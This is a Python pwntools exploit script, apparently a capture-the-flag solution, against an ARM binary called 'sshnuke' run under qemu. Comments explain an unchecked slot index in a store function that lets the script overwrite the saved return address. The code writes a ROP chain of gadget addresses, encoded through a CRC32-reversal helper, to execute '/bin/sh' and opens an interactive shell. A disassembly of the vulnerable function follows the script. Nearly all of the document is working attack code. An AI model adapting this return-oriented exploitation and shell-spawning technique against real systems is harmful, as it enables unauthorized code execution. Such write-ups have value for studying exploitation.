#! /usr/bin/python

from pwn import *
import commands

# Vulnerability is in store function - no check for max slot value slots[12] => overflow 
# => slots[13] = bp (frame pointer, analogue of ebp), slots[14] = pc (program counter, analogue of eip)

# Same vulnerability in read_store => can leak, but ASLR was off, so leak was not needed.


s = process(["./qemu-arm","-nx", "./sshnuke"]) 
#s = process(["./qemu-arm", "-nx", "-g","12345", "./sshnuke"])

def login(login):
    s.sendlineafter('Login: ', login)
    s.recvuntil('CONTROL> ')

def store_data(slot, data, more=False, cont=False):
    if not cont:       
        s.sendline('1')   
    s.sendlineafter('slot: ', str(slot))
    s.sendlineafter('Data for storage: ', data)
    print s.recvline()
    if more:      
        s.sendlineafter('(y/n): ', 'y')
    else:       
        s.sendlineafter('(y/n): ', 'n')
        s.recvuntil('CONTROL> ')

def read_data(slot):
    s.sendline('2')
    s.sendlineafter('read from: ', str(slot))
    result = s.recvline()[18:26]
    #print result
    return result

def crc32_reverse(a):  
  cmd = "crc32.py reverse " + str(a)
  out = commands.getoutput(cmd)  
  #print out, ' >> ', out[86:92], ' >> ', len(out[86:92])
  print 'crc32 rev:', a, ' >> ', out[86:92]
  return out[86:92]


#0x0006f404 : pop {r1, pc}
pop_r1_pc = 0x06f404  
#0x00010160 : pop {r3, pc}
pop_r3_pc = 0x010160
#0x0001a194 : pop {r7, pc}
pop_r7_pc = 0x01a194  
#0x000271a4 : pop {r0, r4, pc}
pop_r0_r4_pc = 0x0271a4  
#0x00041888 : mov r2, r4 ; blx r3
mov_r4_r2_blx_r3 = 0x041888  
#0x0004e8a8 : svc #0 ; pop {r7} ; bx lr
svc_0 = 0x04e8a8

login_str_addr = 0x099014

'''
syscall execve("/bin/sh", argv, env) => execve("/bin/sh", 0, 0)

add r0, 0x099014   ; /bin/sh addr
mov r1, #0
mov r2, #0
mov r7, #11        ; syscall number of execve()
svc #0             ; syscall
'''

login('/bin/sh\x00')

store_data(14, crc32_reverse(pop_r1_pc), True, False)
store_data(15, crc32_reverse(0), True, True)
store_data(16, crc32_reverse(pop_r7_pc), True, True)
store_data(17, crc32_reverse(11), True, True)
store_data(18, crc32_reverse(pop_r3_pc), True, True)
store_data(19, crc32_reverse(svc_0), True, True)   # "blx r3" at the end of our rop will jmp to r3
store_data(20, crc32_reverse(pop_r0_r4_pc), True, True)
store_data(21, crc32_reverse(login_str_addr), True, True)
store_data(22, crc32_reverse(0), True, True)
store_data(23, crc32_reverse(mov_r4_r2_blx_r3), False, True)

s.interactive()


# 0x10bc0  main
# 0x10ae0  login
# 0x10b50  menu
# 0x10b94  store
# 0x10ba0  store_read

#store+188 - our rop gone be called there
#0x000109a8 <+188>:	pop	{r4, r11, pc}


'''
gef> disass store
Dump of assembler code for function store:
   0x000108ec <+0>:	push	{r4, r11, lr}
   0x000108f0 <+4>:	add	r11, sp, #8
   0x000108f4 <+8>:	sub	sp, sp, #52	; 0x34
   0x000108f8 <+12>:	ldr	r3, [pc, #172]	; 0x109ac <store+192>
   0x000108fc <+16>:	ldr	r3, [r3]
   0x00010900 <+20>:	str	r3, [r11, #-16]
   0x00010904 <+24>:	ldr	r0, [pc, #164]	; 0x109b0 <store+196>
   0x00010908 <+28>:	bl	0x106e4 <_write_str>
   0x0001090c <+32>:	bl	0x108d4 <select_slot>
   0x00010910 <+36>:	mov	r2, r0
   0x00010914 <+40>:	ldr	r3, [pc, #152]	; 0x109b4 <store+200>
   0x00010918 <+44>:	str	r2, [r3]
   0x0001091c <+48>:	ldr	r0, [pc, #148]	; 0x109b8 <store+204>
   0x00010920 <+52>:	bl	0x106e4 <_write_str>
   0x00010924 <+56>:	ldr	r3, [pc, #136]	; 0x109b4 <store+200>
   0x00010928 <+60>:	ldr	r4, [r3]
   0x0001092c <+64>:	bl	0x10870 <_do_store>
   0x00010930 <+68>:	mov	r2, r0
   0x00010934 <+72>:	lsl	r3, r4, #2
   0x00010938 <+76>:	sub	r1, r11, #12
   0x0001093c <+80>:	add	r3, r1, r3
   0x00010940 <+84>:	str	r2, [r3, #-44]	; 0x2c
   0x00010944 <+88>:	ldr	r3, [pc, #104]	; 0x109b4 <store+200>
   0x00010948 <+92>:	ldr	r3, [r3]
   0x0001094c <+96>:	lsl	r3, r3, #2
   0x00010950 <+100>:	sub	r2, r11, #12
   0x00010954 <+104>:	add	r3, r2, r3
   0x00010958 <+108>:	ldr	r1, [r3, #-44]	; 0x2c
   0x0001095c <+112>:	ldr	r3, [pc, #80]	; 0x109b4 <store+200>
   0x00010960 <+116>:	ldr	r3, [r3]
   0x00010964 <+120>:	mov	r2, r3
   0x00010968 <+124>:	ldr	r0, [pc, #76]	; 0x109bc <store+208>
   0x0001096c <+128>:	bl	0x173a4 <printf>
   0x00010970 <+132>:	ldr	r0, [pc, #72]	; 0x109c0 <store+212>
   0x00010974 <+136>:	bl	0x106e4 <_write_str>
   0x00010978 <+140>:	bl	0x107e8 <read_answer>
   0x0001097c <+144>:	mov	r3, r0
   0x00010980 <+148>:	cmp	r3, #0
   0x00010984 <+152>:	bne	0x10904 <store+24>
   0x00010988 <+156>:	nop			; (mov r0, r0)
   0x0001098c <+160>:	ldr	r3, [pc, #24]	; 0x109ac <store+192>
   0x00010990 <+164>:	ldr	r2, [r11, #-16]
   0x00010994 <+168>:	ldr	r3, [r3]
   0x00010998 <+172>:	cmp	r2, r3
   0x0001099c <+176>:	beq	0x109a4 <store+184>
   0x000109a0 <+180>:	bl	0x2acf0 <__stack_chk_fail>
   0x000109a4 <+184>:	sub	sp, r11, #8
   0x000109a8 <+188>:	pop	{r4, r11, pc}                    <------------------
   0x000109ac <+192>:	andeq	r7, r9, r12, lsl #31
   0x000109b0 <+196>:	andeq	r8, r9, r8, lsl #1
   0x000109b4 <+200>:	andeq	r9, r9, r12, lsl r6
   0x000109b8 <+204>:	andeq	r8, r9, r0, lsr #1
   0x000109bc <+208>:	strheq	r8, [r9], -r4
   0x000109c0 <+212>:	ldrdeq	r8, [r9], -r8	; <UNPREDICTABLE>
End of assembler dump.

'''




































